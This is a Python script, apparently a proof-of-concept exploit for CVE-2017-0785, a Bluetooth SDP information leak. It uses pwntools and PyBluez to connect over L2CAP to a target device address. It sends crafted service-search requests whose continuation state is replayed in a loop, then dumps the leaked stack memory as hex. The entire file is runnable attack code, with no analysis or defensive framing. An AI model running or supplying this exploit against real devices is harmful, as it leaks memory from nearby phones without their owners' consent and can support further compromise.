from pwn import *
import bluetooth

def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    if type(continuation_state) == str:
        continuation_state = continuation_state.encode()
    pkt += continuation_state
    return pkt

def exploit(target=None):
    if not target:
        try:
            target = args['TARGET']
        except:
            log.info("USAGE: cve20170785.py TARGET=XX:XX:XX:XX:XX:XX")

    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30

    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    p.status('Connecting to target')
    sock.connect((target, 1))

    p.status('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)

    if data[-3] != 2:
        log.error('Invalid continuation state received.')

    stack = ''

    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        stack_add = data[9:-3]
        if type(stack_add) == bytes:
            stack_add = str(stack_add).strip('b\'')
        stack += stack_add

    sock.close()

    p.success('Done')
    
    print(hexdump(stack))

if(__name__=="__main__"):
    exploit()
